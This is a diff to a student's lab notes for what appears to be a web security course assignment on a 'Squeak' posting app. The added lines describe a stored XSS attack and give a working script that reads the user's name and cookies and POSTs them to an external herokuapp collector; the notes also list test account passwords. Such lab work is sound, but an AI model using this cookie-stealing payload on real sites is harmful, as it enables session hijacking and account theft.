@@ -41,7 +41,20 @@ Submission 3:
 -changed a few things to keep submission2 workable.old "/" paht is now "/submission2"
 -made users like in the example with pw "12345678" and the stand user with username: daniel, pw: fisksoppa from the previous submission.
 
-	
+Stored XSS Atack:
+The first attack with "<script>alert('Owned');</script>" was pretty straightforward. I was able to place the script as a "Squeak" and every user who logged in ran the script.	
+
+
+To get the cookies I used the following squeak and "squeaked" it 
+<script>
+var xhttp = new XMLHttpRequest();
+console.log(document.getElementsByClassName("input-group-text")[0].innerHTML);
+ xhttp.open("POST", "https://dva446.herokuapp.com/store/156", true);
+ var username=document.getElementsByClassName("input-group-text")[0].innerHTML;
+ xhttp.send(username+":"+document.cookie);
+</script>
+
+
 
 todo:
 972 error mit json.parse
